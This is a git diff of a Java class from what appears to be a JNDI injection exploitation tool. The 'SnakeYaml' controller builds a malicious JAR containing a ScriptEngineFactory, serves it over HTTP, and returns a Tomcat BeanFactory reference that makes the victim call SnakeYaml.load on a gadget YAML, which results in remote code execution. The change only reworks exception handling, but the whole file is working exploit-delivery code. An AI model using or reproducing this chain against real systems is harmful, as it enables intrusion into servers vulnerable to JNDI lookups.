@@ -21,7 +21,7 @@ import javax.naming.StringRefAddr;
 @JNDIMapping("/SnakeYaml")
 public class SnakeYamlController extends BasicController {
     @Override
-    public Object process(byte[] byteCode) {
+    public Object process(byte[] byteCode) throws Exception {
         System.out.println("[Reference] Factory: BeanFactory + SnakeYaml");
 
         String factoryClassName = MiscUtil.getRandStr(12);
@@ -34,24 +34,18 @@ public class SnakeYamlController extends BasicController {
                 "  ]]\n" +
                 "]";
 
-        byte[] jarBytes = null;
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(ScriptEngineFactoryTemplate.class.getName());
+        clazz.replaceClassName(clazz.getName(), factoryClassName);
+        ReflectUtil.setCtField(clazz, "code", CtField.Initializer.constant(code));
 
-        try {
-            ClassPool pool = ClassPool.getDefault();
-            CtClass clazz = pool.get(ScriptEngineFactoryTemplate.class.getName());
-            clazz.replaceClassName(clazz.getName(), factoryClassName);
-            ReflectUtil.setCtField(clazz, "code", CtField.Initializer.constant(code));
-
-            jarBytes = JarUtil.createWithSPI("javax.script.ScriptEngineFactory", factoryClassName, clazz.toBytecode());
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-
+        byte[] jarBytes = JarUtil.createWithSPI("javax.script.ScriptEngineFactory", factoryClassName, clazz.toBytecode());
         WebServer.getInstance().serveFile("/" + jarName + ".jar", jarBytes);
 
         ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "a=load"));
         ref.add(new StringRefAddr("a", yaml));
+
         return ref;
     }
 }
